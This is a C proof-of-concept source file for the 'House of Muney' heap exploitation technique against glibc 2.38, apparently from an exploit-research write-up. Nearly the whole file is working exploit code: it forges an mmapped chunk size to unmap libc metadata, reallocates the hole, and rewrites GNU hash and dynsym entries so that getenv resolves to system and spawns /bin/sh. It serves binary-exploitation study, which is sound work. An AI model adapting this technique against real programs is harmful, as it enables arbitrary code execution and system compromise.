/*
 * Title   : House of Muney PoC for glibc 2.38
 * Author  : Axura
 * Runtime : Fedora 39 glibc 2.38, build ID 1cd2d1016ef987f11f5709c2aa0deb4520dcc851
 * Website : https://4xura.com/binex/heap/house-of-muney/
 * Compile : gcc -O0 -Wall -Wextra -Werror -fPIE -pie -pthread \
 *             -fno-builtin-getenv -Wl,-z,lazy \
 *             -o house_of_muney_glibc-2.38 house_of_muney_glibc-2.38.c
 * Run     : Use the matching Fedora 39 ld-linux-x86-64.so.2 and libc.so.6.
 *           Pipe "echo MUNEY_SHELL_OK; exit" into stdin for a non-interactive check.
 *
 * This is a local mechanism demonstration. The direct size write, saved libc
 * metadata, and dladdr call are instrumentation, not attacker primitives.
 */

#define _GNU_SOURCE
#include <asm/prctl.h>
#include <dlfcn.h>
#include <elf.h>
#include <malloc.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#define RESTORE_LEN     0x1c000
#define GNU_HASH_OFFSET 0x43f0
#define DYNSYM_OFFSET   0x8bc8
#define GETENV_INDEX    1847
#define GETENV_OFFSET   0x41c10
#define SYSTEM_OFFSET   0x503b0
#define MMAP_SIZE_ADJUST 0

static uintptr_t libc_base;
static void *victim;
static void *saved_metadata;

static uint32_t gnu_hash(const char *name) {
    uint32_t hash = 5381;
    for (const unsigned char *p = (const unsigned char *)name; *p; ++p)
        hash = hash * 33 + *p;
    return hash;
}

static void *run_exploit(void *unused) {
    (void)unused;
    /* Main-thread TLS occupies the three pages below libc. The main thread
       has exited; this worker's FS base must be outside the forged unmap. */
    sleep(1);
    unsigned long fs_base = 0;
    syscall(SYS_arch_prctl, ARCH_GET_FS, &fs_base);

    uintptr_t chunk_base = (uintptr_t)victim - 0x10;
    uintptr_t unmap_end = libc_base + RESTORE_LEN;
    size_t unmap_size = unmap_end - chunk_base;
    printf("[1] victim=%p libc=%p worker FS=%p\n",
           (void *)chunk_base, (void *)libc_base, (void *)fs_base);
    if (chunk_base >= libc_base || (unmap_size & 0xfff) ||
        (fs_base >= chunk_base && fs_base < unmap_end))
        syscall(SYS_exit_group, 2);

    /* glibc 2.38's mmapped chunk size includes the full mapping. */
    ((size_t *)victim)[-1] = (unmap_size - MMAP_SIZE_ADJUST) | 2u;
    printf("[2] forged size=%#lx, unmap [%p, %p)\n",
           ((size_t *)victim)[-1], (void *)chunk_base, (void *)unmap_end);
    free(victim);
    write(1, "[3] forged free returned\n", 25);

    /* Pin the mmap threshold before the free so this request stays mmap-backed.
       The request rounds to the exact size of the newly opened hole. */
    size_t request = unmap_size - 0x20;
    void *replacement = malloc(request);
    printf("[4] replacement=%p, expected=%p\n",
           replacement, (void *)(chunk_base + 0x10));
    if ((uintptr_t)replacement != chunk_base + 0x10)
        syscall(SYS_exit_group, 3);

    /* Restore the libc file-backed metadata as writable anonymous pages.
       This also keeps unrelated symbol lookups functional. */
    memcpy((void *)libc_base, saved_metadata, RESTORE_LEN);

    uint32_t *gnu = (uint32_t *)(libc_base + GNU_HASH_OFFSET);
    uint32_t nbuckets = gnu[0];
    uint32_t symoffset = gnu[1];
    uint32_t bloom_size = gnu[2];
    uint32_t bloom_shift = gnu[3];
    uint64_t *bloom = (uint64_t *)(gnu + 4);
    uint32_t *buckets = (uint32_t *)(bloom + bloom_size);
    uint32_t *chain_zero = buckets + nbuckets - symoffset;
    uint32_t hash = gnu_hash("getenv");
    if (!nbuckets || !bloom_size || (bloom_size & (bloom_size - 1)) ||
        GETENV_INDEX < symoffset)
        syscall(SYS_exit_group, 4);

    size_t bloom_index = (hash / 64) & (bloom_size - 1);
    uint32_t bucket_index = hash % nbuckets;
    bloom[bloom_index] |= (UINT64_C(1) << (hash & 63)) |
                          (UINT64_C(1) << ((hash >> bloom_shift) & 63));
    buckets[bucket_index] = GETENV_INDEX;
    chain_zero[GETENV_INDEX] = hash | 1u;
    printf("[5] GNU hash=%#x, bloom[%zu], bucket[%u]=%u, chain[%u]=%#x\n",
           hash, bloom_index, bucket_index, GETENV_INDEX, GETENV_INDEX,
           chain_zero[GETENV_INDEX]);

    Elf64_Sym *dynsym = (Elf64_Sym *)(libc_base + DYNSYM_OFFSET);
    if (dynsym[GETENV_INDEX].st_value != GETENV_OFFSET)
        syscall(SYS_exit_group, 5);
    dynsym[GETENV_INDEX].st_value = SYSTEM_OFFSET;
    printf("[6] getenv@dynsym -> system, triggering getenv@plt('/bin/sh')\n");

    /* The executable's getenv JUMP_SLOT is still unresolved at this point.
       Its first call now resolves to system with a pointer argument intact. */
    getenv("/bin/sh");
    syscall(SYS_exit_group, 0);
    __builtin_unreachable();
}

int main(void) {
    setbuf(stdout, NULL);
    void *warm = malloc(16);
    free(warm);
    write(1, "House of Muney / glibc 2.38\n",
          sizeof("House of Muney / glibc 2.38\n") - 1);

    Dl_info info;
    if (!dladdr((void *)printf, &info))
        return 1;
    libc_base = (uintptr_t)info.dli_fbase;
    mallopt(M_ARENA_MAX, 1);
    mallopt(M_MMAP_THRESHOLD, 0x20000);
    saved_metadata = malloc(RESTORE_LEN);
    if (!saved_metadata)
        return 1;
    memcpy(saved_metadata, (void *)libc_base, RESTORE_LEN);
    victim = malloc(0x30000);
    if (!victim)
        return 1;

    pthread_t worker;
    if (pthread_create(&worker, NULL, run_exploit, NULL))
        return 1;
    syscall(SYS_exit, 0);
    __builtin_unreachable();
}
